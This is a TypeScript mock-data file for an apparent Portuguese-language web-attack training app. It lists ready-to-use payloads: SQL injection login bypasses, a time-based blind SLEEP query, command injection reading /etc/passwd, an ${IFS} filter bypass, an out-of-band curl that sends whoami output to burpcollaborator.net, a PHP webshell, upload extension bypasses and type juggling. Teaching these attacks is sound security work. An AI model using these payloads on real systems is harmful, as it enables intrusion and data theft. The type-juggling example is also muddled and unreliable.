export interface Vulnerability {
  id: string;
  title: string;
  scenario: string;
  payload: string;
  example: string;
  result: string;
  recon_summary?: string;
  visual_pattern?: string;
  hint_simulation?: string;
  mindset_goal?: string;
  mindset_why?: string;
}

export interface Topic {
  id: string;
  title: string;
  description: string;
  icon: string;
  vulnerabilities: Vulnerability[];
}

export const mockTopics: Topic[] = [
  {
    id: 'sql-injection',
    title: 'SQL Injection',
    description: 'Manipulação de consultas ao banco de dados',
    icon: 'Database', // Will map to a Lucide icon
    vulnerabilities: [
      {
        id: 'sqli-1',
        title: 'Bypass de Login Simples',
        scenario: 'Login form sem sanitização de input',
        payload: "' OR 1=1 --",
        example: "Acesso à rota de login (`POST /api/login`) passando o payload diretamente no campo `username`. A senha pode ser qualquer coisa.",
        result: "```json\n{\n  \"status\": \"success\",\n  \"message\": \"Welcome admin!\",\n  \"user\": {\n    \"id\": 1,\n    \"role\": \"admin\"\n  }\n}\n```",
        recon_summary: "Formulários de autenticação são pontos clássicos de entrada. A injeção de uma aspa simples (') em inputs de usuário pode quebrar a query, evidenciando ausência de sanitização.",
        visual_pattern: "POST /login\nusername=[!!!INPUT!!!]&password=***",
        hint_simulation: "Você deve focar em manipular o campo que interage diretamente com o banco antes da validação da senha. Geralmente é o campo do usuário ou o input não tratado.",
        mindset_goal: "Nosso objetivo é contornar a validação de senha e logar na aplicação sem precisar saber a credencial de um usuário válido.",
        mindset_why: "O banco de dados geralmente executa a checagem com um `WHERE user='X' AND pass='Y'`. Ao inserirmos `' OR 1=1 --` no campo usuário, nós fechamos as aspas da string original e adicionamos uma condição (`1=1`) que é SEMPRE verdadeira. O `--` comenta o resto da query (ignorando a checagem da senha). O banco interpreta que sim, nós somos válidos, e retorna o primeiro usuário da tabela (geralmente o admin)."
      },
      {
        id: 'sqli-2',
        title: 'Time-Based Blind',
        scenario: 'Banco de dados MySQL/MariaDB (Wait for delay)',
        payload: "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) AND '1'='1",
        example: "Exemplo numa busca de produtos: `GET /items?category=shoes' AND (SELECT * FROM (SELECT(SLEEP(5)))a) AND '1'='1`.",
        result: "**Resultado:**\nO servidor injeta o \`SLEEP(5)\` e a resposta da página demora **exatamente 5 segundos a mais** para ser devolvida, indicando que a injeção foi bem-sucedida e o banco está vulnerável.",
        recon_summary: "Se a aplicação não retorna erros visíveis no HTML (Blind), testamos comandos de tempo. O atraso na resposta do servidor (sleep) comprova de forma invisível que nosso comando SQL foi executado.",
        visual_pattern: "GET /items?category=[!!!shoes!!!]",
        hint_simulation: "Você deve anexar o payload no final da string do parâmetro visível na URL para observar a anomalia de tempo.",
        mindset_goal: "Nosso objetivo é confirmar silenciosamente que a aplicação está executando nossos comandos de banco de dados, sem precisar ver nenhum conteúdo de volta na tela.",
        mindset_why: "No mundo real certas páginas simplesmente não exibem erros SQL, nem listam todos os itens do banco de dados na tela. Ao mandarmos o servidor 'dormir por 5 segundos' (`SLEEP(5)`) com o banco de dados executando essa função, se a página inteira carregar em 5 segundos cravados, sabemos que a injeção existe. Assim, conseguimos mais tarde criar scripts que 'adivinham' senhas letra por letra baseando-se no tempo de resposta."
      },
      {
        id: 'sqli-3',
        title: 'Auth Bypass (UNION)',
        scenario: 'Formulário que espera username válido e retorna erro caso exista',
        payload: "' UNION SELECT 1, 'admin', '81dc9bdb52d04dc20036dbd8313ed055'--",
        example: "Bypass quando o backend valida a senha num hash MD5 estático. O hash acima é `1234`.",
        result: "```html\n<!-- Resposta HTTP 200 OK -->\n<div class=\"dashboard\">\n  <h1>Painel de Controle</h1>\n  <p>Bem-vindo(a), admin!</p>\n</div>\n```",
        recon_summary: "Quando o sistema parece buscar algo para depois comparar (como buscar o hash de um user p/ comparar com o input), o comando UNION injeta dados controlados diretamente nos resultados esperados.",
        visual_pattern: "SELECT id, user, passHash FROM users WHERE username='[!!!INPUT!!!]'",
        hint_simulation: "Testando a injeção na variável inicial da query esperada.",
        mindset_goal: "Fazer o banco de dados retornar 'dados controlados e inventados por nós' direto pro servidor, enganando a camada da aplicação.",
        mindset_why: "Um ataque UNION concatena uma nova consulta aos resultados Originais. O servidor achará que encontrou o usuário no DB, mas na verdade está lendo o \"id = 1, user = admin, e uma senha que NÓS sabemos o texto original (neste caso, o hash md5 de 1234)\". Como nós fornecemos o hash, quando o servidor for checar se o nosso input de senha bate com o 'salvo no banco', ele baterá!"
      }
    ]
  },
  {
    id: 'command-injection',
    title: 'Command Injection',
    description: 'Execução arbitrária de comandos no SO',
    icon: 'Terminal',
    vulnerabilities: [
      {
        id: 'cmdi-1',
        title: 'Concatenação Simples',
        scenario: 'Input concatenado sem escape a um utilitário (ex: ping)',
        payload: "; cat /etc/passwd",
        example: "O sistema tem um formulário de ping: `POST /network/ping` com o IP `127.0.0.1; cat /etc/passwd`.",
        result: "```bash\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\n... e segue listando os usuários do sistema UNIX.\n```",
        recon_summary: "Sistemas que fazem chamadas diretas ao Sistema Operacional (ex: ferramentas de rede como traceroute, conversores de PDF) costumam aceitar operadores de controle de terminal como ';' ou '&&'.",
        visual_pattern: "$ip = $_POST['[!!!ip!!!]'];\nsystem('ping -c 4 ' . $ip);",
        hint_simulation: "Use ; para finalizar um comando legitimo e injetar o seu logo em seguida.",
        mindset_goal: "Executar em nível de terminal (shell) códigos que leiam arquivos internos ou comprometam o Servidor raiz da aplicação.",
        mindset_why: "A aplicação web não tratou as variáveis antes de repassar elas pro Terminal. O ponto e vírgula `;` num sistema Linux significa \"Termine o comando anterior e execute o próximo\". Ao enviarmos `127.0.0.1; cat /etc/passwd`, nós fazemos o servidor pingar ali rapidinho o loopback e, em seguida, ele obrigatoriamente abre e exibe na tela o arquivo de usuários secreto do Linux."
      },
      {
        id: 'cmdi-2',
        title: 'Bypass de Espaço',
        scenario: 'Filtro que remove espaços no input',
        payload: "${IFS}cat${IFS}/etc/passwd",
        example: "WAF ou regex que apaga/rejeita conexões com barra de espaço. `$IFS` (Internal Field Separator) é usado no lugar.",
        result: "```text\nroot:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n```\n_O resultado é impresso ignorando o filtro de espaço._",
        recon_summary: "A aplicação recusa a requisição ou filtra os espaços. A variável de ambiente $IFS (Internal Field Separator) atua nativamente em terminais Unix substituindo o 'espaço vazio'.",
        visual_pattern: "if (preg_match('/\\s/', $cmd)) { \n  die('Espaços Bloqueados!');\n}",
        hint_simulation: "Neste cenário evite totalmente usar o barra de espaço, contorne com variáveis de ambiente Unix.",
        mindset_goal: "Burlar filtros de segurança (WAFs e expressões regulares) para forçar um Command Injection onde espaços são proibidos.",
        mindset_why: "Sabendo não podermos injetar comandos separados por espaços pois o servidor não deixa passar, usamos táticas embutidas no próprio terminal alvo. Por padrão, terminais Unix utilizam a constante estrutural `$IFS` para ditar separações. Nós trocamos cada espaço por ela, e no exato instante o terminal for entender o comando (já passando pelos filtros da internet), ele os decoda como os espaços vitais."
      },
      {
        id: 'cmdi-3',
        title: 'Out of Band (OAST)',
        scenario: 'Blind command injection',
        payload: "curl http://burpcollaborator.net/`whoami`",
        example: "Injeção num processamento de logs assíncrono onde **não há retorno na tela**.",
        result: "**Resultado no Burp Collaborator:**\n\n\`\`\`http\nGET /www-data HTTP/1.1\nHost: burpcollaborator.net\nUser-Agent: curl/7.81.0\n\`\`\`\n\nA requisição de DNS/HTTP vaza que o usuário executando no servidor remoto é `www-data`.",
        recon_summary: "Não há pistas visíveis (Output). Força-se o servidor a realizar uma requisição para fora (Exfiltração Out-of-Band via HTTP/DNS) para nossa máquina de ataque controlada.",
        visual_pattern: "POST /report-bug\nmessage=[!!!blind-payload!!!]",
        hint_simulation: "O simulador não retornará resposta visual, force uma submissão para um serviço remoto como o cURL.",
        mindset_goal: "Confirmar que comandos podem e de fato estão sendo executados remotamente num contexto às cegas (Blind Action), visando extrair as primeiras evidências por servidores DNS / HTTP controlados por nós.",
        mindset_why: "Ao não termos tela/output de volta, criamos um sistema de \"eco\" próprio fora da rota normal. A crase (`` `whoami` ``) diz pro terminal rodar esse comando antes do resto. Assim o servidor resolve a variável, concatena na URL e tenta entrar nela. O seu servidor `burpcollaborator.net` verá um ping inesperado de um nome de usuário, vazando uma parte sigilosa dos dados silenciosamente."
      }
    ]
  },
  {
    id: 'php-bypasses',
    title: 'PHP Bypasses',
    description: 'Exploração de upload de arquivos e type juggling',
    icon: 'FileCode',
    vulnerabilities: [
      {
        id: 'php-1',
        title: 'Webshell Simples',
        scenario: 'Upload irrestrito com execução de .php',
        payload: "<?php system($_GET['cmd']); ?>",
        example: "Fez-se o upload deste script nomeado como `shell.php`. Depois é possível acessá-lo no navegador: `GET /uploads/shell.php?cmd=id`.",
        result: "```bash\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```",
        recon_summary: "Painéis de perfil (avatar) ou envios de currículos muitas vezes aceitam arquivos. Se pudermos acessar o diretório de destino publicamente, executamos nossa web-shell.",
        visual_pattern: "Acesso Direto à Shell:\nGET /public/uploads/[!!!shell.php!!!]",
        hint_simulation: "Tente acessar a URI completa simulando que o arquivo já foi feito o upload.",
        mindset_goal: "Escalar as permissões invadindo o acesso web e abrindo um ponto interativo (uma Web Shell) para poder executar códigos C/Linux à vontade na pasta.",
        mindset_why: "O desenvolvedor fez upload para a mesma pasta servindo scripts. Nós construimos este payload para ler uma variável `GET ('cmd')` que nós enviaremos via URL e processar isso no sistema nativo PHP `system()`. Bastou acessar a foto, ela é tratada como código, e você tem controle pleno."
      },
      {
        id: 'php-2',
        title: 'Bypass de Extensão',
        scenario: 'Filtro simples em extensões comuns',
        payload: "arquivo.php5 / arquivo.phtml / arquivo.pHp",
        example: "O desenvolvedor bloqueou a string exata `.php`. Podemos enviar um arquivo `shell.phtml` e o Apache continua a executar como PHP (se estiver mal configurado).",
        result: "**Upload Status:** `200 OK - File shell.phtml uploaded successfully!`.\nO arquivo agora existe e pode ser executado para uma Webshell.",
        recon_summary: "Servidores legados como versões de Apache antigas possuem aliases que compilam extensões alternativas como código PHP padrão.",
        visual_pattern: "$blasklist = ['.php', '.exe'];\nif (in_array($ext, $blacklist)) { ... }",
        hint_simulation: "Contorne a lista bloqueando '.php' usando extensões alternativas como .phtml.",
        mindset_goal: "Evadir validações fracas na hora do upload submetendo um nome tecnicamente válido mas perigosamente ignorado, atingindo objetivo do Web Shell.",
        mindset_why: "Frequentemente sistemas se baseiam apenas em extensões comuns pra bloquear as coisas, tipo `.php`. O core do apache possui mapeamentos profundos onde .hp5 e .phtml TAMBÉM acionam a engine do PHP dependendo da sua velhice ou falha no setup. Você altera essas strings na marra e burla a barreira frontal."
      },
      {
        id: 'php-3',
        title: 'Type Juggling',
        scenario: 'Uso indevido de == ao invés de === em comparação de hash',
        payload: "0e123456",
        example: "Se o servidor comparar `if (md5($password) == \"0e...alguma coisa\")`. Podemos enviar \`0e123456\`.",
        result: "**Resultado:**\nO PHP com `==` trata strings que começam com `0e` seguidas de números como *Notação Científica* (`0 elevado a algo = 0`). Assim, `0e123` é avaliado como `0`, o que casa (`==`) com outro hash `0e999`.\nAutenticação realizada com sucesso sem precisar da senha verdadeira.",
        recon_summary: "O PHP e outras linguagens fracamente tipadas, ao utilizarem os operadores de 'loose comparison' (==), tentam converter strings para inteiros antes de compará-las. Em contexto de Hashes (md5), isso cria uma colisão grave via Notação Científica.",
        visual_pattern: "if (hash('md5', $input) == [!!!$storedHash!!!]) { ... }",
        hint_simulation: "Descubra uma string que em MD5 comece com 0e para explorar o 'Magic Hash'.",
        mindset_goal: "Completar a autenticação de forma sorrateira, abusando das conversões estritas da linguagem PHP sem necessariamente injetar SQL ou alterar bancos de dados.",
        mindset_why: "Sabendo do ponto cego onde `0e123 == 0e999 // true`, basta que pesquisemos em bases de dados abertas da internet ou geremos o nosso próprio texto em texto limpo (`0e123456`) que quando convertido para md5, também resulta num hash iniciando com `0e`. Quando submetemos, o servidor bate o olho num, bate o olho noutro e magicamente fala: são dois números zero, login aceito!"
      }
    ]
  }
];
